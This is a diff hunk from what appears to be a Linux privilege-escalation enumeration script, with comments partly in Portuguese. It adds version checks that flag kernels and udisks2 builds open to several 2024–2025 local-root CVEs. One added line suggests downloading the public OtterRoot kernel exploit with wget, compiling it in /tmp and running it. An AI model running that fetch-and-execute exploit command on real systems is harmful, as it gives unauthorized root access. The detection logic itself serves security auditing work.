@@ -25349,6 +25349,111 @@ if [ -n "$_sudo_recent" ]; then
   fi
 fi
 
+# ── CVE-2024-26809 OtterRoot nftables pipapo double-free (kernel 5.6-6.7) ──
+_kv_maj=$(echo "$KVER" | cut -d. -f1)
+_kv_min=$(echo "$KVER" | cut -d. -f2)
+_kv_pat=$(echo "$KVER" | cut -d. -f3 | grep -oE "^[0-9]+"); _kv_pat=${_kv_pat:-0}
+_26809_vuln=0
+if [ "$_kv_maj" -eq 5 ] && [ "$_kv_min" -ge 6 ] 2>/dev/null; then _26809_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -lt 7 ] 2>/dev/null; then _26809_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -eq 7 ] && [ "$_kv_pat" -lt 2 ] 2>/dev/null; then _26809_vuln=1
+fi
+if [ "$_26809_vuln" = "1" ]; then
+  _nft_loaded=$(lsmod 2>/dev/null | grep -c "nf_tables" || echo 0)
+  _userns=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || echo 1)
+  if [ "$_nft_loaded" -gt 0 ] || [ "$_userns" = "1" ]; then
+    extra_hit "CVE-2024-26809 OtterRoot -- kernel $KVER (5.6-6.7) -- nft_pipapo double-free -- LPE root (PoC: osec.io/otterroot)"
+    add_score 9 "CVE-2024-26809 OtterRoot nftables double-free"
+    add_exploit "wget https://raw.githubusercontent.com/google/security-research/main/pocs/linux/kernelctf/CVE-2024-26809_lts/exploit.c -O /tmp/otterroot.c && gcc -O2 -o /tmp/otterroot /tmp/otterroot.c && /tmp/otterroot"
+  fi
+fi
+
+# ── CVE-2024-50264 vsock/virtio UAF (kernel 4.8-6.11) ──────────────────────
+_50264_vuln=0
+if [ "$_kv_maj" -eq 4 ] && [ "$_kv_min" -ge 8 ] 2>/dev/null; then _50264_vuln=1
+elif [ "$_kv_maj" -eq 5 ] 2>/dev/null; then _50264_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -lt 11 ] 2>/dev/null; then _50264_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -eq 11 ] && [ "$_kv_pat" -lt 8 ] 2>/dev/null; then _50264_vuln=1
+fi
+if [ "$_50264_vuln" = "1" ]; then
+  _vsock=$(grep -c "vsock\|virtio_transport" /proc/modules 2>/dev/null || lsmod 2>/dev/null | grep -c "vsock\|virtio_transport" || echo 0)
+  if [ "$_vsock" -gt 0 ]; then
+    extra_hit "CVE-2024-50264 vsock virtio UAF -- kernel $KVER (4.8-6.11) -- LPE em VMs com virtio-vsock (Pwnie Award 2025)"
+    add_score 8 "CVE-2024-50264 vsock/virtio UAF LPE"
+  fi
+fi
+
+# ── CVE-2024-56614 / CVE-2024-56615 eBPF XSK/DEVMAP OOB (kernel 4.18-6.12) ─
+_bpf_oob_vuln=0
+if [ "$_kv_maj" -eq 4 ] && [ "$_kv_min" -ge 18 ] 2>/dev/null; then _bpf_oob_vuln=1
+elif [ "$_kv_maj" -eq 5 ] 2>/dev/null; then _bpf_oob_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -lt 12 ] 2>/dev/null; then _bpf_oob_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -eq 12 ] && [ "$_kv_pat" -lt 2 ] 2>/dev/null; then _bpf_oob_vuln=1
+fi
+if [ "$_bpf_oob_vuln" = "1" ]; then
+  _bpf_unpriv=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo 1)
+  if [ "$_bpf_unpriv" = "0" ]; then
+    extra_hit "CVE-2024-56614/56615 eBPF XSK/DEVMAP OOB write -- kernel $KVER (4.18-6.12) -- BPF sem restricao -- R/W arbitrario kernel"
+    add_score 8 "CVE-2024-56614/56615 eBPF OOB kernel"
+  fi
+fi
+
+# ── CVE-2024-26923 af_unix race UAF Ubuntu 24.04 (kernel 6.8.x) ────────────
+_26923_vuln=0
+if [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -eq 8 ] && [ "$_kv_pat" -lt 7 ] 2>/dev/null; then _26923_vuln=1; fi
+if [ "$_26923_vuln" = "1" ]; then
+  _ubuntu=$(grep -i "ubuntu" /etc/os-release 2>/dev/null | head -1)
+  if [ -n "$_ubuntu" ]; then
+    extra_hit "CVE-2024-26923 af_unix race UAF -- Ubuntu 24.04 kernel $KVER (6.8.x < 6.8.7) -- LPE local (PoC: TyphoonPWN 2025)"
+    add_score 8 "CVE-2024-26923 af_unix UAF Ubuntu"
+  fi
+fi
+
+# ── CVE-2024-53141 netfilter ipset bitmap OOB (kernel 2.6-6.12) ────────────
+_53141_vuln=0
+if [ "$_kv_maj" -lt 6 ] 2>/dev/null; then _53141_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -lt 12 ] 2>/dev/null; then _53141_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -eq 12 ] && [ "$_kv_pat" -lt 3 ] 2>/dev/null; then _53141_vuln=1
+fi
+if [ "$_53141_vuln" = "1" ]; then
+  _ipset=$(lsmod 2>/dev/null | grep -c "ip_set" || echo 0)
+  if [ "$_ipset" -gt 0 ]; then
+    extra_hit "CVE-2024-53141 ipset bitmap_ip OOB write -- kernel $KVER -- ip_set carregado -- LPE root (EDB-52591)"
+    add_score 7 "CVE-2024-53141 ipset OOB write"
+  fi
+fi
+
+# ── CVE-2024-43882 execve TOCTOU setuid race (kernel 5.5-6.10.6) ───────────
+_43882_vuln=0
+if [ "$_kv_maj" -eq 5 ] && [ "$_kv_min" -ge 5 ] 2>/dev/null; then _43882_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -lt 10 ] 2>/dev/null; then _43882_vuln=1
+elif [ "$_kv_maj" -eq 6 ] && [ "$_kv_min" -eq 10 ] && [ "$_kv_pat" -le 6 ] 2>/dev/null; then _43882_vuln=1
+fi
+if [ "$_43882_vuln" = "1" ]; then
+  extra_hit "CVE-2024-43882 execve TOCTOU setuid race -- kernel $KVER (5.5-6.10.6) -- LPE via chmod+exec simultaneo"
+  add_score 7 "CVE-2024-43882 execve TOCTOU setuid"
+fi
+
+# ── CVE-2025-6019 udisks2 / libblockdev montagem SUID bypass ───────────────
+_udisks_ver=$(udisksctl --version 2>/dev/null | grep -oE "[0-9]+\.[0-9]+\.[0-9]+" | head -1)
+if [ -n "$_udisks_ver" ]; then
+  _ud_maj=$(echo "$_udisks_ver" | cut -d. -f1)
+  _ud_min=$(echo "$_udisks_ver" | cut -d. -f2)
+  _ud_pat=$(echo "$_udisks_ver" | cut -d. -f3)
+  _ud_vuln=0
+  if [ "$_ud_maj" -lt 2 ] 2>/dev/null; then _ud_vuln=1
+  elif [ "$_ud_maj" -eq 2 ] && [ "$_ud_min" -lt 10 ] 2>/dev/null; then _ud_vuln=1
+  elif [ "$_ud_maj" -eq 2 ] && [ "$_ud_min" -eq 10 ] && [ "$_ud_pat" -lt 1 ] 2>/dev/null; then _ud_vuln=1
+  fi
+  if [ "$_ud_vuln" = "1" ]; then
+    _udisks_svc=$(systemctl is-active udisks2 2>/dev/null || echo "unknown")
+    if [ "$_udisks_svc" = "active" ]; then
+      extra_hit "CVE-2025-6019 udisks2 $_udisks_ver < 2.10.1 -- montagem de filesystem image sem protecao SUID via Polkit allow_active -- LPE"
+      add_score 7 "CVE-2025-6019 udisks2 Polkit bypass"
+    fi
+  fi
+fi
+
 echo ""
 
 # ── Rede Interna ─────────────────────────────────────────
